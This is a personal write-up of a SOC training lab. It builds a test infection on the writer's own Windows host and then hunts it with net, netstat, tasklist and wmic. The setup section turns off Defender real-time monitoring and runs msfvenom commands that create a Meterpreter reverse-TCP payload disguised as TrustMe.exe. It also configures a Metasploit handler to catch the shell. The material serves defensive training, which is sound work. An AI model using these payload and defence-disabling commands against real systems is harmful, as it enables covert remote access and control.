---
{"dg-publish":true,"permalink":"/bhis-antisyphon-and-webinars/black-hills-soc-core/labs/bhis-socc-lab-windows-cli/"}
---


## LAB: Windows CLI
[WindowsCLI.md](https://github.com/strandjs/IntroLabs/blob/master/IntroClassFiles/Tools/IntroClass/WindowsCLI/WindowsCLI.md)

In this lab, we're creating and running malware on our system, and then investigating it using [[Tool Deep-Dives/Windows/NET\|net]], [[Tool Deep-Dives/Windows/netstat\|netstat]], [[Tool Deep-Dives/Windows/tasklist\|tasklist]], and [[wmic\|wmic]].

### Windows Lab
1. Get the malware going
	1. Disable protections
		1. First, we disable real time monitoring, because while it's supposed to be off, it might have turned itself back on.
		2. PowerShell, as admin: `Set-MpPreference -DisableRealtimeMonitoring $true`
		3. **You SHOULD get an error.** `A general error occurred that is not covered by a more specific error code.` is a good thing, and means it's already been disabled.
	2. Get the Linux interface name and IP
		1. The lab uses `ifconfig` and I'm used to that, but `ip a` is what all the kids are doing, and you gotta keep up with the times.
			1. Mine is `eth0` and IP `172.17.28.218/20`
			2. *Yours will be different*
	4. Create and deploy the malware
		1. In the same Linux panel, create the Meterpreter malware, and name it something totally legit, like *TrustMe.exe*^[This can be any name you want; for example, notepad.exe]
			1. We're badguys, so jumping right in with `sudo su -`
			2. Create the malware using [[Tool Deep-Dives/Metasploit/msfvenom\|msfvenom]], a Metasploit payload generator and encoder.
				1. `msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp lhost=eth0 lport=4444 -f exe -o /tmp/TrustMe.exe`
				2. **NOTE**: `lhost` can be the IP *or* the interface.
					1. I'm making this kinda copy-paste^[We'll see how that goes if/when I come back to this lab in a few weeks time.], so using `eth0` instead of my IP
			3. Check the file and move it onto the Windows system in the tools folder
				1. `cd /tmp && ls -l TrustMe.exe && cp ./TrustMe.exe /mnt/c/tools`
	5. Start the Metasploit handler^[I never met a sploit I couldn't handle.^[I'm sorry, I'm so sorry, please don't hate me.]]
		1. Create a new terminal in Linux and elevate to root
			1. `sudo su -`
		2. Configure Metasploit
			1. Launch Metasploit
				1. `msfconsole -q`
			2. Configure the handler
				1. `use exploit/multi/handler`
				2. `set PAYLOAD windows/meterpreter/reverse_tcp`
				3. `set LHOST eth0`
			3. [Run](https://www.youtube.com/watch?v=mw2kKyJu9gY)
				1. `exploit`
		3. Execute `TrustMe.exe`
			1. Open CMD as Admin, `cd \tools`, then run `TrustMe.exe`
			2. **NOTE**: While I was documenting everything, something got borked and it didn't work.
				1. I think I just took too long.
				2. I killed the Terminal, killed the "Apache Workbench" (or something similar) in Task Manager, and started from the beginning, and everything worked fine.
		4. Confirm we have access
			1. Navigate back over to the Metasploit terminal, and you should see the connection initiated
			2. ![BHIS-SOCC-lab-WindowsCLI.png](/img/user/Attachments/BHIS-SOCC-lab-WindowsCLI.png)
2. Create a sharedrive and some sessions
	1. This is not part of the malware section, and I think it's just setup
	2. Open CMD as Admin, and create a new shared folder
		1. `net share class=C:\Tools`
			2. `net share` creates a shared folder
			3. `class` is the name of the shared folder, and it routes to `C:\Tools`
				1. The share name could be anything; `tools`, `sharedrive`, or `BunchOfGarbageFiles`
			4. The folder can then be accessed with `\\<computer address>\class`
				1. This is either the name of the computer or its network address
				2. e.g., `\\Computer-name\class` or `\\192.168.0.1\class`
		2. `net use * \\127.0.0.1\c$`
			1. `net use` maps a network share to a local drive number
			2. `*` tells it to use the first available drive number
				1. In my case, `Z:`
			3. `\\127.0.0.1\c$` identifies the remote computer (`127.0.0.1`) and the *remote* assigned drive name (`c$`)
				1. In this case, the C drive
				2. Many years ago in a fairly unrestricted work environment, I would often remotely drop scripts and installers directly onto client computers by going to `\\JDOE-1234\c$\Installers`
					1. These files would then be accessible at `C:\Installers`
3. Find the baddies
	1. Start by checking for network shares on this computer
		1. `net session`
			1. Shows us all the remote sessions initiated on this computer.
		2. `net use`
			1. Shows all the active shared drive connections, in this case the share locally known as `Z:`, and remotely known as `\\127.0.0.1\c$`
		3. `net view \\127.0.0.1`
			1. Since we've noticed that 127 address being used in the prior two commands, we can use `net view` to investigate it a little more
			2. Shows all shared resources at `\\127.0.0.1`, which is the [loopback address](https://ccnadefinitions.com/ccna/20-definitions/i-pv4-address-classes/)^[The address the computer uses to refer to itself.] of the computer
			3. You should see a `Disk` called `class` listed here.
				1. If there were more than one share, you would see more.
	2. Let's use [[Tool Deep-Dives/Windows/netstat\|netstat]] to investigate
		1. `netstat -naob`
			1. List active processes; grab the PID for any suspicious *ESTABLISHED* sessions (e.g. `trustme.exe`)
				1. In my case, the PID is `7472`
			2. The format is a little unintuitive, but the first line is indented; The malware is highlighted below.
				1. ![BHIS-SOCC-lab-WindowsCLI-1.png](/img/user/Attachments/BHIS-SOCC-lab-WindowsCLI-1.png)
	3. `netstat -f`
		1. Shows all established connections and their *Foreign Address* (`-f`)
			1. Domainless connections are pretty sus, and of course our malware ain't got no domain!
	4. `tasklist /m /fi "pid eq <PID>"`
		1. Find the associated file in the [[Tool Deep-Dives/Windows/tasklist\|tasklist]] and its associated modules (`/m`)
	5. `wmic process where processid=<PID> get commandline`
		1. This is way to indicate if something was launched from commandline
			1. Resources launched from commandline will typically just be the resource, and not the full path, etc.
		2. `TrustMe.exe` has a fairly simple output, but that got me thinking; let's do an experiment with Notepad.
			1. Launch Notepad in three ways:
				1. Start menu > Notepad
					1. Launching notepad like normal
				2. cmd: `C:\Users\adhd> notepad.exe /?`
					1. The `/?` will throw a syntax error, but Notepad will still launch and it gives us a clear delineator
				3. cmd: `"C:\WINDOWS\system32\notepad.exe"`
					1. This should mimic launching Notepad like a normal user
			2. Find the PIDs with `tasklist /m /fi "imagename eq notepad.exe"`
				1. ![BHIS-SOCC-lab-WindowsCLI-3.png](/img/user/Attachments/BHIS-SOCC-lab-WindowsCLI-3.png)
			3. Take the PID from each Notepad process and run the `wmic` command from earlier.
				1. ![BHIS-SOCC-lab-WindowsCLI-4.png](/img/user/Attachments/BHIS-SOCC-lab-WindowsCLI-4.png)
			4. As we can see, the Notepad processes with PID 7064 and 4036 look identical
	6. `wmic process get name,parentprocessid,processid`
		1. Pipe it to `| find "[PID]"` to identify all processes associated with the PID or parent PID
			1. Here, I progressively searched down the parent Process ID to see who launched what and when
			2. ![BHIS-SOCC-lab-WindowsCLI-2.png](/img/user/Attachments/BHIS-SOCC-lab-WindowsCLI-2.png)
		2. So this is interesting, but let's go back and check our notepad example
			1. We can see the two processes we kicked off from the Terminal
				1. ![BHIS-SOCC-lab-WindowsCLI-5.png](/img/user/Attachments/BHIS-SOCC-lab-WindowsCLI-5.png)
			2. Here I've drilled into the processes started in the Terminal
				1. The parent process is `WindowsTerminal.exe`, and we can see all the other shenanigans it's got running.
				2. ![BHIS-SOCC-lab-WindowsCLI-6.png](/img/user/Attachments/BHIS-SOCC-lab-WindowsCLI-6.png)
			4. Here's what we see with the normally-begun process; it was started by "explorer.exe"
				1. It looks much more straightforward and clean.
				2. ![BHIS-SOCC-lab-WindowsCLI-8.png](/img/user/Attachments/BHIS-SOCC-lab-WindowsCLI-8.png)

### Thoughts
This was interesting, but feels like it could be optimized; maybe a script that specifically looks for processes begun by PowerShell or cmd.exe, or could visualize it by showing the whole process tree of suspicious activity. Maybe a [[Tool Deep-Dives/Python/Python\|Python]] project...

#### Other tools for threat hunting
[[Tool Deep-Dives/DeepBlueCLI\|DeepBlueCLI]]
[[Tool Deep-Dives/Windows/Sysmon\|Sysmon]]
